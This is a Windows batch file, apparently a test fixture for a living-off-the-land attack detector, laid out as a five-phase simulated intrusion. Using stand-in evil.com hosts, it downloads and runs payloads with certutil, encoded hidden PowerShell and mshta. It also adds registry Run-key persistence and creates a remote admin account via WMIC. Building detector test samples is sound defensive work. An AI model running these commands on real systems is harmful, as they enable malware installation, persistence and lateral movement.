# Simulated LOtL attack script for testing
# This is NOT real malware - for TESTING purposes only

@echo off
REM Simulated Living-Off-The-Land attack

REM PHASE 1: Download payload using certutil (LOtL technique)
certutil -urlcache -split -f http://evil.lazarus.example.com/payload.exe C:\temp\update.exe

REM PHASE 2: Execute with PowerShell in hidden mode (LOtL technique)
powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AYwBvAG0AIgA=

REM PHASE 3: Add persistence via registry
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "SystemUpdate" /t REG_SZ /d "C:\temp\update.exe" /f

REM PHASE 4: Execute secondary payload with mshta
mshta vbscript:Execute("CreateObject(""WScript.Shell"").Run ""powershell IEX((New-Object Net.WebClient).DownloadString('http://evil.com/stage2.ps1'))"", 0:close")

REM PHASE 5: Use WMIC for lateral movement
wmic /node:192.168.1.100 process call create "cmd.exe /c net user admin P@ssw0rd /add"

echo [SIMULATED ATTACK COMPLETE - This is a test file for LOtL detector]
